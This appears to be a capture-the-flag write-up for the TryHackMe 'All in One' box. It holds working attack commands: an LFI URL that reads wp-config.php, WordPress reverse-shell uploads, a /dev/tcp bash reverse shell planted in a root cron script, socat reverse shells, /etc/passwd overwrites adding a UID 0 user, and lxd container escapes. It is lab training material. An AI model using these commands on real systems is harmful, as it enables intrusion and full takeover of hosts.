```bash
# PLATFORM          . THM
# CTF NAME          . All in One
# DESCRIPTION       . This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/allinonemj
```

```
sudo nmap -sSVC -T5 -p- 10.10.123.139 -oN allinone
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e25c3322765c9366cd969c166ab317a4 (RSA)
|   256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA)
|_  256 fbfadbea4eed202b91189d58a06a50ec (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- The FTP allows for anonymous login but there is nothing inside of it. 

- The webserver running on port 80 displays the default apache page ; 

- After enumerating for directories, I found out the `/wordpress` endpoint.

- Enumerating `/wordpress` further, I found `wp-admin`, `wp-content` and `wp-includes`.

- Enumerating the wordpress endpoint using `wpscan` reveals two plugins being used

```
[+] mail-masta
 | Location: http://10.10.123.139/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.123.139/wordpress/wp-content/plugins/mail-masta/readme.txt


[+] reflex-gallery
 | Location: http://10.10.123.139/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.123.139/wordpress/wp-content/plugins/reflex-gallery/readme.txt
```

- Upon further googling, I found out that [`mail-masta 1.0` is vulnerable to LFI](https://www.exploit-db.com/exploits/40290) by using the following endpoint

```
http://10.10.123.139/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=
```

- A simple `/etc/passwd` at the end will reveal the content of the file ; 

- I tried looking for `wp-content.php` so I can check the wordpress config.

- I managed to access that file by using the base64 PHP filter to display the result in base64 to the client (our browser) and then I've decoded that.

```
http://10.10.123.139/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

```
...truncated

define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', '{REDACTED}' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

... truncated
```

- We are able to login to wordpress as elyana using the password found in this config.

- After playing around the dashboard, I found the following ways of uploading a reverse shell.

	**VIA AKISMET PLUGIN**
	
	1. Go to `Plugins` -> Activate Akismet Anti-Spam plugin. 
	2. Go to `Plugins` -> Plugin Editor. 
	3. Replace the content of `akismet.php` with a PHP reverse shell. Save.
	4. Navigate to `http://IP/wp-content/plugins/akismet/akismet.php`

	* **NOTE**: `index.php` and any other `.php` file from akismet plugin can be used to get the same results, just navigate to the according page after editing the content of the file.

	**VIA THEME EDIT**

	1. Go to `Appearance -> Editor`.
	2. On the right hand side of the screen click `Templates`.
	3. I chose to edit the `404 Template` which is the content displayed when the 404 error occurs.
	4. Replace the existing code a PHP reverse shell code.
	5. Access it via `http://ip/wp-content/themes/twentyfifteen/404.php`.

	**VIA PLUGIN UPLOAD**

	1. Navigate to `Plugins` -> Upload new plugin.
	2. Upload a reverse .php shell.
	3. After upload is done, go to `Media` on the side menu.
	4. The file should be listed in `Media -> Library`.
	5. Click on it / edit the file. You should see the link you can use to access the file.


- After getting a reverse shell, I checked the content of `/home/elyana`.

```
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
```

```
Elyana's user password is hidden in the system. Find it ;)
```

- Trying to find Elyana's password, I found multiple ways of escalating privileges. Check below.

#### **PRIVILEGE ESCALATION** - via credentials in .txt `wwwdata -> elyana

- I decided to search for files that I have full permission for (rwx), besides the /var/backups/script. I found this after the escalation vector from crontab. (see below)

```
find / -type f -perm 0777 2>/dev/null
```

```
/var/backups/script.sh
/etc/mysql/conf.d/private.txt
```

```
cat /etc/mysql/conf.d/private.txt 

user: elyana
password: E{redacted}t
```

#### **PRIVILEGE ESCALATION** - via crontab `wwwdata -> root`

```
*  *    * * *   root    /var/backups/script.sh
```

- The following script is ran by `root` via `crontab`. However, we have full permissions on this file.

```
-rwxrwxrwx 1 root root 113 Dec 29 00:51 /var/backups/script.sh
```

- I replaced the content of the script with a simple bash reverse shell.

```
#!/bin/bash
sh -i 5<> /dev/tcp/ip/3133 0<&5 1>&5 2>&5
```

```
Listening on 0.0.0.0 3133
Connection received on 10.10.7.178 40172
sh: 0: can't access tty; job control turned off
# whoami
root
```

##### **PRIVILEGE ESCALATION** - via SOCAT SUID `elyana -> root`

- I've used `find / -type f -perm -04000 -ls 2>/dev/null` to list all files with the SUID bit set.

```
150297    392 -rwsr-sr-x   1 root     root         400624 Apr  4  2018 /usr/bin/socat
```

- SOCAT is not one of the regular outputs of this command, so I've investigated it further.

- I also noticed that socat can be run as sudo by `elyana` without the need of a password.

- I started the following socat listener on my side: ```socat file:`tty`,raw,echo=0 tcp-listen:12345```

```
sudo /usr/bin/socat	tcp-connect:IP:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

```
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

##### **PRIVILEGE ESCALATION** - via SOCAT (another way) `elyana -> root`

- Since we can run socat as sudo, we can use socat to spawn a root shell.

```
bash-4.4$ sudo /usr/bin/socat stdin exec:/bin/sh
whoami
root
```

##### **PRIVILEGE ESCALATION** - via SOCAT (aand another one) `elyana -> root`

- Socat can be used to transfer files as well. Since we can run it as sudo, we can replace whatever file we want.

- I copied the content of `/etc/passwd` from the target (since it's readable by anyone) and copied the text to a file on my box.

- At the end, I appended a new entry, making a new user called `newroot` with UID and GUID 0.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
{TRUNCATED}
newroot:$6$Q3xG8Q2NdD8igFjy$pJmQvtu9WDHIUPNw4rl2bhufhDWUWAjcNNZpnLeZKHs6NtgLRaX8F4hEF581HSSwVlD0P/hAKVaJi8rhPpdqH1:0:0:root:/root:/bin/bash
```

- The hash was generated using `openssl passwd -6 test`.

- Then, on my box, I've set up the following listener

```bash
# passwd = file containing the content of /etc/passwd + new user.
socat -u file:passwd tcp-listen:12345,reuseaddr 
```

- On the target, I've used the following socat command to replace `/etc/passwd`.

```
sudo /usr/bin/socat -u tcp-connect:IP:12345 open:/etc/passwd,creat
```

- Next, all I had to do was use `su newroot` with `test` as password.

```
root@elyana:/var/www/html/wordpress# id
uid=0(root) gid=0(root) groups=0(root)
```

##### **PRIVILEGE ESCALATION** - via SOCAT (round 4) `elyana -> root flag`

- You can read files you don't have access to as well :D

```
sudo /usr/bin/socat -u "file:/root/root.txt" -
```

##### **PRIVILEGE ESCALATION** - via SOCAT (round 5?) `elyana -> root (nope)

- Socat can be used to write to files we don't have access to (since we can run it as sudo), but the syntax below *OVERRIDES* the current content of the file.

- We could technically echo `newroot2:$6$Q3xG8Q2NdD8igFjy$pJmQvtu9WDHIUPNw4rl2bhufhDWUWAjcNNZpnLeZKHs6NtgLRaX8F4hEF581HSSwVlD0P/hAKVaJi8rhPpdqH1:0:0:root:/root:/bin/bash` in there, but it would the only entry in the box.

```
sudo /usr/bin/socat -u 'exec:echo blablabla' "open:/etc/passwd,creat"
```

```
> su newroot
> whoami
> 
> l
> ls
> cat etc/passwd
> 
```

- I broke the shell lmao :D I mean, not really. CTRL + C will return to our shell as elyana and nothing was appended to `/etc/passwd`. However, I'll leave this here just to know that socat can be used to write on files too.

##### **PRIVILEGE ESCALATION** - via lxd group `elyana -> root`

 **LOCAL HOST

```
git clone https://github.com/saghul/lxd-alpine-builder

cd lxd-alpine-builder

sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine

sudo ./build-alpine -a i686
```

**VICTIM

```
# import the image

# It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
lxc image import ./alpine*.tar.gz --alias myimage 

# before running the image, start and configure the lxd storage pool as default 
# default [enter] to all of them should do the job ; rename whatever needs renamed if default already exists
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh

cd /mnt/root
```

#### PRIVILEGE ESCALATION - via lxd group (ROUND TWO) `elyana -> root`

```
sudo su

#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

#Clone repo
git clone https://github.com/lxc/distrobuilder

#Make distrobuilder
cd distrobuilder

make

#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

- Then, transfer the image to the vulnerable server.

**VICTIM

```
#add the image
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

```
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

`Error: No storage pool found. Please create a new storage pool` -> 
Run **`lxd init`** and **repeat** the previous chunk of commands.

```
lxc start privesc
lxc exec privesc /bin/sh

cd /mnt/root
```

_____

- Anyway. Fun box, probably still missed even more ways to root this box or get initial access. Maybe I'll make time to do another run on this box.

- User flag located at `/home/elyana/user.txt`
- Root flag located at `/root/root.txt`

**NOTE**: flags are base64 encoded. decode them before submitting.
